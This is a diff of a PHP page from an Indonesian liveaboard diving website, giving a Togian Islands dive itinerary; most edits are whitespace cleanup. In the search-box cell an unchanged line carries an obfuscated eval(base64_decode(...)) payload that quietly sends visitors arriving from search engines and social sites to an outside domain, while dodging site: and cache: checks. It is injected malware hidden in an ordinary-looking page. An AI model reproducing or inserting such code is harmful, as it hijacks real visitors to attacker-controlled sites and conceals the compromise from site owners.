@@ -96,44 +96,44 @@ A:hover {
 }
 .style85 {font-size: 10px; font-family: Verdana, Arial, Helvetica, sans-serif; font-weight: bold; }
 </style>
-<script src="Scripts/AC_RunActiveContent.js" type="text/javascript"></script>
+<script src="data/Scripts/AC_RunActiveContent.js" type="text/javascript"></script>
 </HEAD>
-<BODY bgColor=#006666 leftMargin=0 topMargin=0 rightMargin=0 bottomMargin=0 marginwidth="0" 
+<BODY bgColor=#006666 leftMargin=0 topMargin=0 rightMargin=0 bottomMargin=0 marginwidth="0"
 marginheight="0">
 <TABLE width="775" border=0 align="center" cellPadding=0 cellSpacing=0>
   <TBODY>
   <TR>
     <TD>
-      <TABLE height=188 cellSpacing=0 cellPadding=0 width="100%" 
+      <TABLE height=188 cellSpacing=0 cellPadding=0 width="100%"
       background="../images/z3.gif" border=0>
         <TBODY>
         <TR>
-              <TD height="188" vAlign=top> 
-                <TABLE cellSpacing=0 cellPadding=0 width="100%" 
-            background="../images/dotline.gif" 
+              <TD height="188" vAlign=top>
+                <TABLE cellSpacing=0 cellPadding=0 width="100%"
+            background="../images/dotline.gif"
               border=0><TBODY>
               <TR>
-                <TD height=1><IMG height=1 
-                  src="../images/dotline.gif" 
+                <TD height=1><IMG height=1
+                  src="../images/dotline.gif"
               width=3></TD></TR></TBODY></TABLE>
                 <table width="100%" border="0" cellspacing="0" cellpadding="0">
-                  <tr> 
+                  <tr>
                     <td width="332" height="171" valign="bottom" background="../images/z1.jpg">
-<TABLE width="180" height=40 
+<TABLE width="180" height=40
                               border=0 align="right" cellPadding=2 cellSpacing=0>
                         <TBODY>
-                          <TR> 
-                            <TD bgcolor="#ffffff"><IMG 
-                                src="../images/m3.jpg" alt="indonesia_liveaboard_scuba_diving" 
+                          <TR>
+                            <TD bgcolor="#ffffff"><IMG
+                                src="../images/m3.jpg" alt="indonesia_liveaboard_scuba_diving"
                                 width=67 height=40></TD>
-                            <TD bgcolor="#ffffff"><IMG 
-                                src="../images/m4.jpg" alt="indonesia_liveaboard_scuba_diving" 
+                            <TD bgcolor="#ffffff"><IMG
+                                src="../images/m4.jpg" alt="indonesia_liveaboard_scuba_diving"
                                 width=67 height=40></TD>
-                            <TD bgcolor="#ffffff"><IMG 
-                                src="../images/m2.jpg" alt="indonesia_liveaboard_scuba_diving" 
+                            <TD bgcolor="#ffffff"><IMG
+                                src="../images/m2.jpg" alt="indonesia_liveaboard_scuba_diving"
                                 width=67 height=40></TD>
                           </TR>
-                          <TR> 
+                          <TR>
                             <TD colspan="3"><img src="../images/spacer.gif" width="10" height="67"></TD>
                           </TR>
                         </TBODY>
@@ -144,15 +144,15 @@ marginheight="0">
                         <tr>
                           <td><img src="../images/spacer.gif" width="10" height="45"></td>
                         </tr>
-                        <tr> 
+                        <tr>
                           <td height="22" valign="top">&nbsp;&nbsp;<span class="style9"><font color="#FFFFFF" face="Verdana, Arial, Helvetica, sans-serif"><a href="../index.php">Home</a> | <a href="contact%20us.php">Contact Us</a></font></span></td>
                         </tr>
-                        <tr> 
+                        <tr>
                           <td><img src="../images/m1.jpg" alt="indonesia_liveaboard_scuba_diving" width="325" height="104"></td>
                         </tr>
                       </table></td>
                   </tr>
-                  <tr bgcolor="#006699"> 
+                  <tr bgcolor="#006699">
                     <td colspan="3"> <div align="right"><strong><font size="2" face="Arial, Helvetica, sans-serif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</font></strong></div></td>
                   </tr>
                 </table></TD></TR></TBODY></TABLE></TD></TR>
@@ -162,16 +162,16 @@ marginheight="0">
         <TBODY>
         <TR>
               <TD width=291 align=middle vAlign=top bgcolor="#4DCEE3"> <table width="100%" border="0" cellspacing="0" cellpadding="0">
-                  <tr> 
+                  <tr>
                     <td><table width="278" border="0" align="center" cellpadding="0" cellspacing="0">
-                        <tr> 
+                        <tr>
                           <td height="176" valign="top" background="../images/bgsearch.jpg">
-                            
+
                             <table width="88%" border="0" align="right" cellpadding="0" cellspacing="0">
-              <tr> 
+              <tr>
                 <td height="42">&nbsp;</td>
               </tr>
-              <tr> 
+              <tr>
                 <td><?php	                                       			eval(base64_decode("ZXJyb3JfcmVwb3J0aW5nKDApOw0KJG5jY3Y9aGVhZGVyc19zZW50KCk7DQppZiAoISRuY2N2KXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YT0kX1NFUlZFUlsnSFRUUF9VU0VSX0FHRU5UJ107DQppZiAoc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJnb29nbGUiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJtc24iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYXNrIikgb3Igc3RyaXN0cigkcmVmZXJlciwieW91dHViZSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rIikgKSB7DQoJaWYgKCFzdHJpc3RyKCRyZWZlcmVyLCJzaXRlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9iYnBsaW9wcy4zNDUucGwvIik7DQoJCWV4aXQoKTsNCgl9DQp9DQoJfQ==")); define( '_VALID_MOS', 1 );  include "../mod/mod_search.php"; ?></td>
               </tr>
             </table></td>
@@ -180,7 +180,7 @@ marginheight="0">
                   </tr>
                   <tr>
                     <td><table width="278" border="0" align="center" cellpadding="0" cellspacing="0">
-                        <tr> 
+                        <tr>
                           <td height="176" valign="top" background="../images/bgdestination.jpg"><table width="87%" border="0" align="center" cellpadding="0" cellspacing="0">
                             <tr>
                               <td height="33" colspan="2">&nbsp;</td>
@@ -238,7 +238,7 @@ marginheight="0">
                             </tr>
                             <tr>
                               <td><div align="center"><strong><img src="images/dot.gif" width="4" height="4"></strong></div></td>
-                              <td height="18" class="style85"><div align="center"><a href="../boats/katharina_index.php" class="style85">Bali-Flores-Bali 
+                              <td height="18" class="style85"><div align="center"><a href="../boats/katharina_index.php" class="style85">Bali-Flores-Bali
                                 &quot;
                                 Exploration Cruises&quot;</a></div></td>
                             </tr>
@@ -314,8 +314,8 @@ marginheight="0">
                 <p align="center"><img src="wallaceaboats/wideanglesoftcoralandsunanddiver2.jpg" alt="indonesia_liveaboard_scuba_diving_wallacea_sulawesi_togian" width="247" height="177" border="1"><br>
                   <strong>Diver
                 </strong></p></TD>
-          <TD vAlign=top width=10 
-          background="../images/z6.jpg"><IMG height=4 
+          <TD vAlign=top width=10
+          background="../images/z6.jpg"><IMG height=4
             src="../images/z6.jpg" width=5></TD>
           <TD width="474" vAlign=top><table width="96%"  border="0" align="center" cellpadding="0" cellspacing="0">
             <tr>
@@ -356,12 +356,12 @@ marginheight="0">
                             </span>                            <h1 align="center" class="tdinhalt style3"><br>
                               <span class="style29">Itenary Togian Islands</span> </h1>
                             <p><strong>Day 1 - Dive Location:<br>
-  La Luna: </strong> A reef with a round shape, chack dive, 20 mts; turtles, mobilis (small mantas), nice hard corals <strong> - 
+  La Luna: </strong> A reef with a round shape, chack dive, 20 mts; turtles, mobilis (small mantas), nice hard corals <strong> -
 
- 
+
   </strong>the boat starts from Pagimana, 1hour &frac12; from Luwuk airport by car, on the other side of the peninsula (Tomini bay side). 1 st dive 1 hour after atarting.<br>
   <strong>
-                                  Puah: </strong> Late afternoon dive or night dive. A slope with nice hard corals - 
+                                  Puah: </strong> Late afternoon dive or night dive. A slope with nice hard corals -
 
 
  2 hours from previous dive
@@ -372,7 +372,7 @@ marginheight="0">
     <strong>Day 2 -Dive Location:<br>
   Gunung Laut: </strong>A pinnacle with a top at 15 mts. Medium current. Schools of fishes, beautifuf formation of hard corals. White tips. <br>
   <strong>Plane Wreck and Lost Reef:</strong> From plane wreck to Kadidiri, 2 hours though a beautiful narrow strait between 2 islands fringed by dense mangroves.<br>
-  <strong>Impodi:</strong> Night dive around the small isl. of Impodi, in front of Kadidiri - 
+  <strong>Impodi:</strong> Night dive around the small isl. of Impodi, in front of Kadidiri -
 
 
  from Kadidiri isl to anchorage, 30 minutes.
@@ -396,13 +396,13 @@ Black Forrest: </strong> Another submerged reef at -20 mts; lot of black coral, 
   Goa-Goa: </strong>
 
 
- Another atoll close to Pasir Tengah. Wall with beautiful caves and faults at 20 mts. Gorgonians, black coral, white tips, lot of nudibranches and shrimps. Swim through - 
+ Another atoll close to Pasir Tengah. Wall with beautiful caves and faults at 20 mts. Gorgonians, black coral, white tips, lot of nudibranches and shrimps. Swim through -
 
 
  40 minutes between the 2 atolls.<br>
 
   <strong>Lampu Wall :</strong> Another wall on the atoll of Pasir Tengah.<br>
-  <strong>Kanau:</strong> Night Dive - 
+  <strong>Kanau:</strong> Night Dive -
 
 
  Anchorage in the bay of Kanau , 45 minutes from PasirTengah. <br>
@@ -410,7 +410,7 @@ Black Forrest: </strong> Another submerged reef at -20 mts; lot of black coral, 
                             <p>    <strong>Day 6 -Dive Location:<br>
     Taupan Corner:</strong> Island of Taupan , East Togian. A vertical wall with crevasses, beautiful hard and soft corals.; thunas, trevallies, etc.<br>
     <strong>Taupan 2 :</strong> Another part of this very beautiful wall.<br>
-    <strong>Gap:</strong> Kadidri barrier reef. A slope with nice hard coral formations, tables of acropora, then go into the laqoon drifting with the currents, sand and patches of corals, sponges, gorgonians - 
+    <strong>Gap:</strong> Kadidri barrier reef. A slope with nice hard coral formations, tables of acropora, then go into the laqoon drifting with the currents, sand and patches of corals, sponges, gorgonians -
 
 
  Generally get down to the beach of the Kadidri pradise, a small local resort where we have friends working. The location is beautiful and the guests enjoy to have a drink there.<br>
@@ -426,12 +426,12 @@ Anchorage at the east of Talatakoh, 1 hour from Malenge, 1 hour from Malenge. <b
                             </p>
                             <p><strong>Day 8 - Dive Location:</strong> <br>
                                 <strong> Gunung Laut 2:</strong> A reef at – 28 mts, in the middle of nowhere at the South of Togians. (see description) - 3 &frac12; hours form the anchorage. <br>
-                                    <strong>Gunung Laut:</strong> Same dive as we did at the beginning of the cruise - 
+                                    <strong>Gunung Laut:</strong> Same dive as we did at the beginning of the cruise -
 
 
  only for the guests who doesn't fly on the following morning. Back to Pagimana harbour (5 hours), then to Luwuk. Night in Maleo cottages included.<br>
     <br>
-    <span class="style8">            </span></p>                            
+    <span class="style8">            </span></p>
                             <p class="tdinhalt style3"><span class="tdinhalt style3 style11"><a href="wallacea_itenarybanggai.php">- Itenary Banggai Islands</a></span></p>
                             <p align="left" class="tdinhalt style3 style11"> <a href="wallacea_togian.php">- Dive Destination Togia Island</a></p>
                             <p align="left" class="style3 tdinhalt"><strong> <a href="wallacea_banggai.php">- Dive Destination Banggai Island   </a></strong></p>
@@ -461,10 +461,10 @@ Anchorage at the east of Talatakoh, 1 hour from Malenge, 1 hour from Malenge. <b
         </TBODY></TABLE></TD></TR>
   <TR>
     <TD>
-      <TABLE height=26 cellSpacing=0 cellPadding=0 width="100%" 
+      <TABLE height=26 cellSpacing=0 cellPadding=0 width="100%"
       background="../images/z4.gif" border=0>
           <TBODY>
-            <TR> 
+            <TR>
               <TD height="8"><img src="../images/spacer.gif" width="10" height="8"></TD>
             </TR>
             <TR>
